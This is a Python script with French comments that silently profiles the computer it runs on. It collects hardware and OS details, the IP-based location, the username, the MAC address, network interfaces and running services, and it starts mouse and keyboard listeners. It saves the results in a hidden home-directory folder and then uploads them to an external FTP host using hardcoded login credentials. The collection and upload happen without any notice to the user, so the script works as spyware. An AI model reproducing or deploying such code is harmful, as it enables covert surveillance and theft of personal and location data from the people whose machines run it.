# -*- coding: utf-8 -*-
import csv,psutil,datetime,os,sys,geocoder,subprocess,platform
from pyquickhelper.loghelper import run_cmd
from ftplib import FTP
from pynput.mouse import Listener
from pynput.keyboard import Key, Listener




def secs2hours(secs):
    mm, ss = divmod(secs, 60)
    hh, mm = divmod(mm, 60)
    return "%d:%02d:%02d" % (hh, mm, ss)

dict = {}

dict_info_anal = {}
def save_output(dictionary, output_file_name,headerVerify):
    with open(output_file_name, 'a+', newline='') as csvfile:
        writer = csv.writer(csvfile)
        if(headerVerify):
            writer.writerow(dictionary)  # First row (the keys of the dictionary).
            values=dictionary.values()
            writer.writerow(values)
        else:
            values=dictionary.values()
            writer.writerow(values)
        

#determination de la date du systeme

dict["date heure"] = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
dict_info_anal["date heure"]  = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
ladateest = datetime.datetime.now().strftime("%Y_%m_%d")
heurest = datetime.datetime.now().strftime("%H")

#determination du type os

    
if (psutil.POSIX) :
    dict["type os"] = "POSIX"
elif (psutil.LINUX) :
    dict["type os"] = "LINUX"
elif (psutil.WINDOWS) :
    dict["type os"] = "WINDOWS"
elif (psutil.MACOS) :
    dict["type os"] = "MACOS"
elif (psutil.FREEBSD) :
    dict["type os"] = "FREEBSD"
elif (psutil.NETBSD) :
    dict["type os"] = "NETBSD"
elif (psutil.OPENBSD) :
    dict["type os"] = "OPENBSD"
elif (psutil.BSD) :
    dict["type os"] = "BSD"
elif (psutil.SUNOS) :
    dict["type os"] = "SUNOS"
elif (psutil.AIX) :
    dict["type os"] = "AIX"
elif (psutil.OSX) :
    dict["type os"] = "MACOS"


dict_info_anal["type os"] = dict["type os"]

    
    

 
#determination la memoire du disque dur par partition
partitions = {} 
info_part_nom = []
info_part_max_mem = []
info_part_mem_use = []
info_syfile_part = []
info_pourcentage_mem_use = []
info_part_mem_libre = []
memoire_totale_libre = 0
nombre_total_de_partitions = 0

tt = psutil.disk_partitions()
for i , elt in enumerate(tt):
    if(elt[2]!= ""):
        tt_use =  psutil.disk_usage(elt[1])
        info_part_nom.append(elt[0])
        info_part_max_mem.append(tt_use[0])
        info_part_mem_use.append(tt_use[1])
        memoire_totale_libre = memoire_totale_libre + tt_use[2]
        info_part_mem_libre.append(tt_use[2])
        info_pourcentage_mem_use.append(tt_use[3])
        info_syfile_part.append(elt[2])
        nombre_total_de_partitions = nombre_total_de_partitions + 1        


partitions["nom des partitions"] = info_part_nom
partitions["memoire total par partition"] = info_part_max_mem
partitions["memoire utilise par partition"] = info_part_mem_use
partitions["memoire libre par partition"] = info_part_mem_libre
partitions["pourcentage de memoire utilise par partition"] =  info_pourcentage_mem_use
partitions["type de systeme de fichier par partition"] = info_syfile_part
dict["information dd"] = partitions
dict_info_anal["memoire total de sotckage libre"] = memoire_totale_libre
dict_info_anal["nombre de partitions"] = nombre_total_de_partitions



   

#determination  caracteritisque de la mémoire ram et swap
tt = psutil.virtual_memory()
info_ram = {}
info_swap = {}
info_nom_mem = []
ram_swap = {}


info_ram["memoire ram utilsé"] = tt[3]
info_ram["memoire ram libre"] = tt[4]
info_ram["pourcentage utilisation de la ram"] = tt[2]
info_ram["memoire ram total"] = tt[0]

dict_info_anal["memoire ram libre"] = info_ram["memoire ram libre"]

tt = psutil.swap_memory()

info_swap["memoire swap utilsé"] = tt[1]
info_swap["memoire swap libre"] = tt[2]
info_swap["pourcentage utilisation du swap"] = tt[3]
info_swap["memoire swap total"] = tt[0]


dict_info_anal["memoire swap libre"] = info_swap["memoire swap libre"]


info_nom_mem.append("ram")
info_nom_mem.append("swap")

ram_swap["nom memoire"] =  info_nom_mem
ram_swap["info ram"] =  info_ram
ram_swap["info swap"] =  info_swap


dict["information memoire"] = ram_swap



#determination des caracteristique et utilisation du cpu 

tt =psutil.cpu_freq()

info_cpu = {}

info_cpu["pourcentage utilisation du cpu"] = psutil.cpu_percent(interval=1)
info_cpu["nombre de processeur logigue"] = psutil.cpu_count(logical=True)




dict_info_anal["pourcentage utilisation du cpu"] = info_cpu["pourcentage utilisation du cpu"]
dict_info_anal["nombre de processeur logigue"] = info_cpu["nombre de processeur logigue"]




dict["information sur le cpu"] = info_cpu


#determination des infos battery
info_bat = {}
tt = psutil.sensors_battery()
if (tt == None):
    info_bat["etat de la batterie"] = "abscente"
else:
    info_bat["etat de la batterie"] = "presente"
    info_bat["pourcentage de battery"] =  tt[0]
    if(tt[1]>0):
        info_bat["duree autonomie restante"] = secs2hours(tt[1])
    else:
        info_bat["duree autonomie restante"] = "max"
    
    
    if(tt[2]):
        info_bat["batterie en charge"] = "oui"
    else:
        info_bat["batterie en charge"] = "non"
        
          
dict["information sur la battery"] = info_bat



#determination du type os

if info_bat["etat de la batterie"] == "abscente" :
    dict["type machine"] = "Desktop" 
else:
    dict["type machine"] = "Labtop"


#Recuperation des états de la souris et du clavier

def on_move(x, y):
    print('Pointer moved to {0}'.format(
        (x, y)))

def on_click(x, y, button, pressed):
    print('{0} at {1}'.format(
        'Pressed' if pressed else 'Released',
        (x, y)))
    if not pressed:
        # Stop listener
        return False

def on_scroll(x, y, dx, dy):
    print('Scrolled {0}'.format(
        (x, y)))

# Collect events until released
with Listener(on_move=on_move,on_click=on_click,on_scroll=on_scroll) as listener:
    dict["etat souris"] ="a boucher"

if dict["etat souris"] != "a boucher":
    dict["etat souris"] = "pas boucher"
    



def on_press(key):
    print('{0} pressed'.format(
        key))

def on_release(key):
    print('{0} release'.format(
        key))
    if key == Key.esc:
        # Stop listener
        return False

# Collect events until released
with Listener(on_press=on_press, on_release=on_release) as listener:
    dict["etat clavier"] ="clavier toucher"

if dict["etat clavier"]!= "clavier toucher":
    dict["etat clavier"] = "clavier non toucher"
    
    
    

#Recuperation de état de la connection

def pingOk(sHost):
    try:
        subprocess.check_output("ping -{} 1 {}".format('n' if platform.system().lower()=="windows" else 'c', sHost), shell=True)
    except :
        return False

    return True

if pingOk("google.com"):
    dict["etat connection"]  = "active"
else:
    dict["etat connection"]  = "non active"



#Recuperation de la position geometrique et du nom de emplacement geometrique

g = geocoder.ip('me')
dict["lieux geometrique et coordonnees"] = (g.address , g.latlng)

#determination des infos profiles
    
tt = psutil.users()

dict["profile utilisateur"] = tt[0][0]
dict_info_anal["profile utilisateur"] = tt[0][0]

#Adresse MAc Utilisateur 
mac_address_info = psutil.net_if_addrs()
dict["info reseaux"] = mac_address_info

for key, val in mac_address_info.items():
    mon_adress_mac = val[0][1]
    break

dict_info_anal["adress mac"] = mon_adress_mac

#Recuperation des services

if dict_info_anal["type os"] == "WINDOWS":
    dict["liste des services en cours"]  = list(psutil.win_service_iter())
else:
    dict["liste des services en cours"]  = psutil.process_iter()






#creation du repertoire et insertion du fichier
chemin = os.path.expanduser('~')
chemin = os.path.join(chemin , '.inforecup')
try:
    os.mkdir(chemin) 
except:
    print("")


if sys.platform.startswith("win"):
    cmd = "ATTRIB " + chemin + " +h"
    out, err = run_cmd(cmd, wait=True)

#nom fichier

nomfichier_info_complet = "informations_completes_machine_" + dict_info_anal["profile utilisateur"] + "_" + mon_adress_mac.replace("-","_") + "_"+ladateest+ ".csv"
nomfichier_info_analyse= "informations_analyse_machine_" + dict_info_anal["profile utilisateur"] + "_" + mon_adress_mac.replace("-","_") + "_"+ladateest+ ".csv"
nomfichier_info_complet = str(nomfichier_info_complet.lower())
nomfichier_info_analyse = str(nomfichier_info_analyse.lower())






#ecriture des données dans un fichier csv

w = csv.writer(open(os.path.join(chemin,nomfichier_info_complet), "w"))
for key, val in dict.items():
    w.writerow([key, val])
try:
    w = open(os.path.join(chemin,nomfichier_info_analyse), "r+")   
    ligne=w.readline()
    if ligne!='':
        flag=False
    else:
        flag=True
except:
    w = open(os.path.join(chemin,nomfichier_info_analyse), "w+")
    flag=True   

w.close()
save_output(dict_info_anal, os.path.join(chemin,nomfichier_info_analyse),flag)


try:
    w = open(os.path.join(chemin,"envoieffectuerfichieranalyse.txt"), "r+")   
    ligne=w.readline()
    if ligne!='':
        flag=False
    else:
        flag=True
except:
    w = open(os.path.join(chemin,"envoieffectuerfichieranalyse.txt"), "w+")
    flag=True  
    
w.close()


try:
    w = open(os.path.join(chemin,"envoieffectuerfichierinfocomplet.txt"), "r+")   
    ligne=w.readline()
    if ligne!='':
        flagb=False
    else:
        flagb=True
except:
    w = open(os.path.join(chemin,"envoieffectuerfichierinfocomplet.txt"), "w+")
    flagb=True  
    
w.close()

if int(heurest)>=0 and flag:
    try:   
        ftp = FTP('ftp.drivehq.com', 'rootknr123', 'lavielaplusbelle')
        try:
         ftp.mkd("lesinfosanalyses")
         ftp.sendcmd("CWD lesinfosanalyses")
         f = open(os.path.join(chemin,nomfichier_info_analyse),'rb')
         rep = ftp.storbinary('STOR ' + nomfichier_info_analyse, f)
         f.close
         try:
             rep.index("226")
             w = open(os.path.join(chemin,"envoieffectuerfichieranalyse.txt"), "w")
             w.write(rep)
         except:
             print("")
        except:
         ftp.sendcmd("CWD lesinfosanalyses")
         f = open(os.path.join(chemin,nomfichier_info_analyse),'rb')
         rep = ftp.storbinary('STOR ' + nomfichier_info_analyse , f)
         f.close
         try:
             rep.index("226")
             w = open(os.path.join(chemin,"envoieffectuerfichieranalyse.txt"), "w")
             w.write(rep)
         except:
             print("")
        ftp.quit()
    except:
        print("connection pas reussi")




if int(heurest)>=0 and flagb:
    try:
        ftp = FTP('ftp.drivehq.com', 'rootknr123', 'lavielaplusbelle') 
        try:
         ftp.mkd("lesinfoscompletes")
         ftp.sendcmd("CWD lesinfoscompletes")
         f = open(os.path.join(chemin,nomfichier_info_complet),'rb')
         rep = ftp.storbinary('STOR ' + nomfichier_info_complet, f)
         f.close
         try:
             rep.index("226")
             w = open(os.path.join(chemin,"envoieffectuerfichierinfocomplet.txt"), "w")
             w.write(rep)
         except:
             print("")
        except:
         ftp.sendcmd("CWD lesinfosanalyses")
         f = open(os.path.join(chemin,nomfichier_info_analyse),'rb')
         rep = ftp.storbinary('STOR ' + nomfichier_info_complet, f)
         f.close
         try:
             rep.index("226")
             w = open(os.path.join(chemin,"envoieffectuerfichierinfocomplet.txt"), "w")
             w.write(rep)
         except:
             print("")
         ftp.quit()
    except:
        print("connection pas reussi")
    
